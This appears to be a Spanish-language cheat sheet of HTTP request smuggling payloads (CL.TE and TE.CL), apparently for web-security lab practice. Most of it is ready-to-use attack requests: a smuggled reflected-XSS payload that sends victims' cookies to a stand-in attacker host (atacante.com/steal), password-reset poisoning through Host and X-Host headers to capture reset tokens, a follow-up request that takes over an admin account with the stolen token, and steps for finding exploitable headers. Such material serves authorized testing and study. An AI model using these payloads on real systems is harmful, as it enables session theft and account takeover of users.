
## 1. CL.TE — Response Queue Poisoning (XSS reflejado en parámetro)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: [RECALCULAR]
Transfer-Encoding: chunked

0

GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fatacante.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive

```

**Notas:**

- `Content-Length` = bytes exactos desde `0\r\n` hasta el `\r\n\r\n` final (cuenta con Burp, no a mano).
- Cambia `/search?q=` por el parámetro/endpoint reflejado que hayas identificado.
- Cambia `atacante.com` por tu dominio Collaborator/servidor propio.
- Objetivo: la respuesta con el `<script>` queda en la cola del backend y se entrega a la siguiente víctima que reutilice esa conexión keep-alive.

### Variante con X-Host

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: [RECALCULAR]
Transfer-Encoding: chunked

0

GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fatacante.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1
Host: vulnerable-website.com
X-Host: atacante.com
Connection: keep-alive

```

**Nota X-Host:** usar cuando el front-end valida/bloquea `Host` alterado pero no valida `X-Host`. El backend usa `X-Host` para construir URLs en la respuesta → el script cargado apunta a `atacante.com`. Recalcula `Content-Length` porque `X-Host: atacante.com\r\n` añade bytes extra.

## 2. CL.TE — Password Reset Poisoning

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: [RECALCULAR]
Transfer-Encoding: chunked

0

POST /forgot-password HTTP/1.1
Host: atacante.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [LEN_BODY]
Connection: keep-alive

csrf=TOKEN_VALIDO&email=admin@vulnerable-website.com
```

**Notas:**

- `Content-Length` (externo) = bytes exactos desde `0\r\n` hasta el final del body `csrf=...email=...` (sin `\r\n` extra al final).
- `Content-Length` (interno, de `/forgot-password`) = longitud exacta del body `csrf=...email=...`.
- Cambia `Host: atacante.com` por tu dominio controlado — ahí llegará el link del email de reset.
- `csrf` debe ser un token válido (a menudo genérico/no ligado a sesión en apps vulnerables, o el endpoint no lo requiere).
- Tras recibir el token en tu servidor (`atacante.com/reset-password?token=...`), úsalo directamente contra la app legítima:

```http
POST /reset-password HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [LEN_BODY]

token=TOKEN_ROBADO&new-password=Pwned123!&confirm-password=Pwned123!
```

### Variante con X-Host

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: [RECALCULAR]
Transfer-Encoding: chunked

0

POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Host: atacante.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [LEN_BODY]
Connection: keep-alive

csrf=TOKEN_VALIDO&email=admin@vulnerable-website.com
```

**Nota X-Host:** usar cuando el front-end rechaza `Host` alterado pero no filtra `X-Host`. El backend prioriza `X-Host` para generar el link de reset → el email llega con `https://atacante.com/reset-password?token=...`. `Host` se deja como el legítimo para no activar filtros del front-end. Recalcula ambos `Content-Length` tras añadir el header.

## Recordatorio rápido de conteo (Burp Repeater) — CL.TE

1. Selecciona desde `0\r\n` hasta el `\r\n\r\n` final del bloque smuggleado.
2. Lee el contador de bytes en la barra inferior.
3. Pega ese número en `Content-Length`.
4. Repite si modificas cualquier parte del payload.

# Cheatsheet: TE.CL Request Smuggling — Payloads

> En TE.CL el front-end usa `Transfer-Encoding` (procesa los chunks) y el back-end usa `Content-Length` (solo lee los primeros N bytes). El `Content-Length` engañoso hace que el back-end corte antes de tiempo y trate el resto como una petición nueva.

## 1. TE.CL — Response Queue Poisoning (XSS reflejado en parámetro)

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

[HEX_LEN]
GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fatacante.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive

0

```

**Notas:**

- `Content-Length: 4` = longitud fija de la línea `[HEX_LEN]\r\n` **solo si** el valor hexadecimal ocupa 2 caracteres (ej. `5c`). Si tu chunk size ocupa más o menos dígitos hex, recalcula (longitud del hex + 2 por el `\r\n`).
- `[HEX_LEN]` = tamaño en **hexadecimal** del chunk, es decir, el número de bytes exactos desde el inicio de `GET /search...` hasta justo antes del `0\r\n` final (sin incluirlo). Cuenta con Burp y convierte a hex.
- El `0\r\n\r\n` al final cierra el chunked encoding de cara al front-end (obligatorio para que no espere más datos).
- Cambia `/search?q=` y `atacante.com` como en la versión CL.TE.

### Variante con X-Host

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

[HEX_LEN]
GET /search?q=%3Cscript%3Edocument.location%3D%27https%3A%2F%2Fatacante.com%2Fsteal%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E HTTP/1.1
Host: vulnerable-website.com
X-Host: atacante.com
Connection: keep-alive

0

```

**Nota X-Host:** igual que en CL.TE — añade `X-Host: atacante.com` en la petición smuggleada. Recalcula `[HEX_LEN]` y `Content-Length: 4` tras añadir el header.

## 2. TE.CL — Password Reset Poisoning

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

[HEX_LEN]
POST /forgot-password HTTP/1.1
Host: atacante.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [LEN_BODY]
Connection: keep-alive

csrf=TOKEN_VALIDO&email=admin@vulnerable-website.com
0

```

**Notas:**

- `Content-Length: 4` = igual que arriba, ajusta según los dígitos hex de `[HEX_LEN]`.
- `[HEX_LEN]` = bytes exactos (en hex) desde `POST /forgot-password HTTP/1.1` hasta el final del body `csrf=...email=...` (justo antes del `0\r\n` final).
- `Content-Length: [LEN_BODY]` (interno) = longitud exacta del body `csrf=...email=...`.
- Cambia `Host: atacante.com` por tu dominio controlado.
- Recuperación del token y reset final: igual que en la versión CL.TE (petición normal a `/reset-password` con el token capturado).

### Variante con X-Host

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

[HEX_LEN]
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Host: atacante.com
Content-Type: application/x-www-form-urlencoded
Content-Length: [LEN_BODY]
Connection: keep-alive

csrf=TOKEN_VALIDO&email=admin@vulnerable-website.com
0

```

**Nota X-Host:** `Host` se mantiene legítimo para no activar filtros del front-end. `X-Host: atacante.com` es el que el backend usa para generar el link de reset. Recalcula `[HEX_LEN]` y `Content-Length: 4` tras añadir el header.

---

## Recordatorio rápido de conteo para TE.CL (Burp Repeater)

1. Selecciona el contenido del chunk (desde la línea que sigue a `[HEX_LEN]\r\n` hasta justo antes del `0\r\n` final).
2. Lee el número de bytes seleccionados en la barra inferior de Burp.
3. Convierte ese número a **hexadecimal** → ese es tu `[HEX_LEN]`.
4. Ajusta `Content-Length: 4` según cuántos caracteres ocupe `[HEX_LEN]` (normalmente 4 = 2 dígitos hex + `\r\n`; si son 3 dígitos hex, sería `Content-Length: 5`).
5. Repite todo el cálculo si modificas el payload.

# Descubrimiento de headers vulnerables (X-Host y similares)

## 1. Burp Collaborator (método principal)

Usa el **Param Miner** de Burp con la opción "Guess headers" activa, apuntando a Collaborator como destino. O manualmente, inyecta el header sospechoso con tu subdominio de Collaborator y observa si recibes una interacción HTTP/DNS:

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Host: tusubdominio.burpcollaborator.net
X-Forwarded-Host: tusubdominio.burpcollaborator.net
X-Original-Host: tusubdominio.burpcollaborator.net
```

Si recibes un ping DNS o HTTP en Collaborator → el backend procesa ese header y hace una petición saliente usando su valor (por ejemplo, para cargar un recurso, generar una URL, o enviar un email).

## 2. Lista de headers candidatos a probar

```
X-Host
X-Forwarded-Host
X-Original-Host
X-Forwarded-Server
X-HTTP-Host-Override
Forwarded: host=atacante.com
X-Real-IP
X-Originating-IP
X-Remote-IP
X-Client-IP
True-Client-IP
X-Override-Host
```

## 3. Param Miner (automatizado)

1. Instala la extensión **Param Miner** en Burp Suite.
2. Haz clic derecho en la petición → `Extensions > Param Miner > Guess headers`.
3. Activa la opción `Use Collaborator` para que Param Miner inyecte tu dominio Collaborator en cada header candidato.
4. Param Miner prueba automáticamente cientos de headers no estándar y marca cuáles generan interacción o respuesta diferente.

## 4. Detección manual por respuesta diferente

Si no tienes Collaborator, busca diferencias en la respuesta al inyectar cada header:

- ¿Cambia alguna URL en la respuesta HTML (links, scripts, atributos `action` de formularios)?
- ¿Cambia algún valor en un header de respuesta (`Location`, `Set-Cookie` con dominio, `Content-Security-Policy`)?
- ¿Aparece tu valor reflejado en algún sitio del body?

Cualquier reflejo o alteración de la respuesta indica que el backend consume ese header.

## 5. Confirmar con valor controlado

Una vez identificado el header candidato, sustituye el valor de Collaborator por un dominio que controles y verifica:

- En **password reset**: ¿llega el email con tu dominio en el link?
- En **cache poisoning**: ¿aparece tu dominio en URLs de recursos de la respuesta cacheada?
- En **open redirect**: ¿redirige a tu dominio?
